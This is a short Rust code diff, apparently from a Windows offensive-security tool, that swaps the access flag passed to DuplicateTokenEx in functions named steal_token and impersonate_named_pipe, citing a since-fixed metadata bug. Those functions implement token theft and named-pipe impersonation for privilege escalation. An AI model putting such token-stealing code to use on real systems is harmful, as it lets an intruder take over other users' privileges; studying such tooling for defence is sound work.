@@ -13,7 +13,6 @@ use windows_sys::Win32::{
             PIPE_READMODE_BYTE, PIPE_READMODE_MESSAGE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
             PIPE_WAIT,
         },
-        SystemServices::MAXIMUM_ALLOWED,
         Threading::{
             CreateProcessWithTokenW, GetCurrentThread, OpenThreadToken, CREATE_NEW_CONSOLE,
             LOGON_WITH_PROFILE, PROCESS_INFORMATION, STARTUPINFOW,
@@ -78,7 +77,7 @@ pub fn steal_token(process_id: u32) -> Result<isize, Error> {
     let duplicate_token_result = unsafe {
         DuplicateTokenEx(
             token_handle,
-            MAXIMUM_ALLOWED,
+            TOKEN_ALL_ACCESS,
             std::ptr::null_mut(),
             SecurityImpersonation,
             TokenPrimary,
@@ -325,7 +324,7 @@ pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
     let duplicate_token_result = unsafe {
         DuplicateTokenEx(
             thread_token,
-            MAXIMUM_ALLOWED, // bug if you use TOKEN_ALL_ACCESS (983295). MUST USE MAXIMUM_ALLOWED (33554432)
+            TOKEN_ALL_ACCESS, // bug https://github.com/microsoft/win32metadata/issues/1410 (fixed in latest version)
             std::ptr::null_mut(),
             SecurityImpersonation,
             TokenPrimary,
